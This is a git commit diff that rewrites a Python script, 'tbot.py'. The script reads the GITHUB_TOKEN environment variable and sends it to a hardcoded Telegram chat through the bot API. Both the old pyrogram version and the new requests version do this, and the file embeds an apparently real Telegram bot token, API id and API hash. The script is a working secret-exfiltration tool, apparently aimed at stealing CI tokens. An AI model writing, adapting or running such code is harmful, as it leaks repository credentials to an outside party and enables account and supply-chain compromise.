00b9ca6fa6a0b0e4b29f0e19de89bb16e90049c1
ITZ ARCTIX <144344981+teamarctix@users.noreply.github.com>
2024-03-11 21:47:56 +0530

    Update tbot.py

--- tbot.py
+++ tbot.py
@@ -1,30 +1,24 @@
-from pyrogram import Client, filters
+import requests
 import os
-import sys
 
-# Replace 'YOUR_BOT_TOKEN', 'YOUR_API_ID', 'YOUR_API_HASH', and 'TARGET_USER_ID' with your actual values
+def send_telegram_message(bot_token, chat_id, text):
+    api_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    params = {'chat_id': chat_id, 'text': text}
+
+    response = requests.get(api_url, params=params)
+    return response.json()
+
+# Replace 'YOUR_BOT_TOKEN', 'YOUR_CHAT_ID' with your actual values
 bot_token = '6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I'
-api_id = '11405252'
-api_hash = 'b1a1fc3dc52ccc91781f33522255a880'
-target_user_id = '1881720028'  # Replace with the actual user ID to whom you want to send the message
+chat_id = '1881720028'
 
-app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
+# Use the actual value of the GITHUB_TOKEN environment variable
+github_token = os.getenv("GITHUB_TOKEN")
+message_text = f'The GitHub token is: `{github_token}`'
 
-async def send_github_token():
-    # Replace 'your_github_token' with your actual GitHub token
-    github_token = os.getenv("GITHUB_TOKEN")
-    
-    try:
-        # Send the GitHub token to the specified user
-        await app.send_message(target_user_id, f'GitHub Token: {github_token}')
-        print("Message sent successfully!")
-    except Exception as e:
-        print(f"Error sending message: {e}")
-    finally:
-        # Stop the code after sending the message
-        await app.stop()
-        sys.exit()
+response = send_telegram_message(bot_token, chat_id, message_text)
 
-# Call the function to send the token when the script starts
-app.start()
-app.loop.run_until_complete(send_github_token())
+if response['ok']:
+    print('Message sent successfully!')
+else:
+    print(f'Failed to send message. Error: {response["description"]}')
